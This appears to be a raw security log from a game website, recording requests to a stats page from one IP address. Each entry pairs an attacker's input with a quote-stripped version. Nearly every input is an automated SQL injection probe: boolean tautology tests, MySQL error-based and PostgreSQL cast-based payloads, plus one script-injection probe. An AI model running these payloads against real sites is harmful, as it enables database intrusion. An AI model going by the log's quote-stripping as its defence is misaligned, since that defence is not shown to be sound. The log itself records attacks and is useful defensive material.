Date: 13-09-2017 03:14:54 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ,,,',".(.,, Fixed: Annabelle            ,,,,.(.,, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:55 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            'uZOfha<'">wuboPu, Fixed: Annabelle            uZOfhawuboPu, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:55 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND 2811=7187 AND ('WQqV'='WQqV, Fixed: Annabelle            ) AND 2811=7187 AND (WQqV=WQqV, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:55 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND 9274=9274 AND ('Xarb'='Xarb, Fixed: Annabelle            ) AND 9274=9274 AND (Xarb=Xarb, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:55 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND 2852=6238 AND 'kOts'='kOts, Fixed: Annabelle             AND 2852=6238 AND kOts=kOts, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:56 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND 9274=9274 AND 'uJyL'='uJyL, Fixed: Annabelle             AND 9274=9274 AND uJyL=uJyL, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:56 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %' AND 6230=9848 AND '%'=', Fixed: Annabelle            % AND 6230=9848 AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:56 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %' AND 9274=9274 AND '%'=', Fixed: Annabelle            % AND 9274=9274 AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:57 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('VFeJ'='VFeJ, Fixed: Annabelle            ) AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (VFeJ=VFeJ, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:57 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'YVgj'='YVgj, Fixed: Annabelle             AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND YVgj=YVgj, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:57 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %' AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'=', Fixed: Annabelle            % AND (SELECT 8568 FROM(SELECT COUNT(*),CONCAT(0x71627a6b71,(SELECT (ELT(8568=8568,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:14:57 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ) AND 2497=CAST((CHR(113)||CHR(98)||CHR(122)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2497=2497) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) AND (1335=1335, Fixed: Annabelle            ) AND 2497=CAST((CHR(113)CHR(98)CHR(122)CHR(107)CHR(113))(SELECT (CASE WHEN (2497=2497) THEN 1 ELSE 0 END))::text(CHR(113)CHR(112)CHR(106)CHR(107)CHR(113)) AS NUMERIC) AND (1335=1335, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
